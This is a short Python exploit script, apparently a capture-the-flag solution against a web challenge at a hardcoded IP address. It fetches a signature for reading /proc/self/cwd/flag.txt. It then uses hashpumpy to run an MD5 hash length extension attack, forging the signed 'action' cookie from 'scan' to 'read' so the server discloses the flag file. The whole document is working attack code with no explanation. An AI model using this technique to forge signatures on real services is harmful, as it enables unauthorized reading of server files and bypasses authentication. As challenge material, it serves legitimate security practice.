import requests
import string
import hashlib
import hashpumpy
my_ip="39.108.225.101"
req=requests.Session()
url="http://39.108.225.101:8083"

def get_sign():
	p=req.get(url+"/geneSign"+"?param=/proc/self/cwd/flag.txt")
	return(p.content.decode('utf-8'))

def md5(content):
	print (hashlib.md5(content.encode(encoding='utf-8')).hexdigest())
	#content=content.encode("utf8")
	return( hashlib.md5(content.encode(encoding='utf-8')).hexdigest())

def gen_result_file(sign):
	cookie={"action":"scan","sign":sign}
	p=req.get(url+"/De1ta?param=/proc/self/cwd/flag.txt",cookies=cookie)
	return(p.content.decode('utf-8'))

def get_flag(sign):
	string0="scan"
	string1="read"
	a, b = hashpumpy.hashpump(sign,string0,string1,39)
	print(a,"\n",b)
	cookie={"action":str(b)[2:-1].replace("\\x","%"),"sign":a}

	p=req.get(url+"/De1ta?param=/proc/self/cwd/flag.txt",cookies=cookie)

	return(p.content.decode('utf-8'))
if __name__ == '__main__':
	#print(get_sign())
	sign=get_sign()
	print(gen_result_file(sign))
	print(get_flag(sign))


